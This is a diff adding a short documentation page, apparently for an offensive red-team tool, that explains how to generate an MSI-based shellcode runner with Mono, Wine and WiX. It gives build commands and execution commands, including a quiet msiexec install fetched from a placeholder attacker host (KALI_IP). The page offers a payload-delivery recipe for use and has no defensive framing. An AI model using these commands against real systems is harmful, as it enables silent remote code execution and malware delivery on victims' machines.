@@ -1,0 +1,32 @@
+---
+title: "MSI Runner"
+description: "Generate and execute MSI-based shellcode runners."
+---
+
+Uses Mono, Wine, and an XML template. Output: `payloads/MSI/shellcode_runner.msi`.
+
+## Steps
+
+1. Modify `line 16` in `Templates/MSI/shellcode_runner.xml`
+2. Run `apophis.sh` to generate the MSI
+3. Execute:
+
+```cmd
+msiexec /q /i shellcode_runner.msi
+msiexec /q /i http://KALI_IP/shellcode_runner.msi
+```
+
+## Manual Generation
+
+```bash
+# Create .wixobj
+cd Templates/MSI/wix311-binaries
+mono candle.exe -out ../ -arch x64 ../shellcode_runner.xml
+
+# Generate .MSI
+wine light.exe -out ../shellcode_runner.msi ../shellcode_runner.wixobj -sval
+```
+
+<Warning>
+Requires Wine installed. See the [Installation](/tools/apophis/install) page for Wine setup steps.
+</Warning>
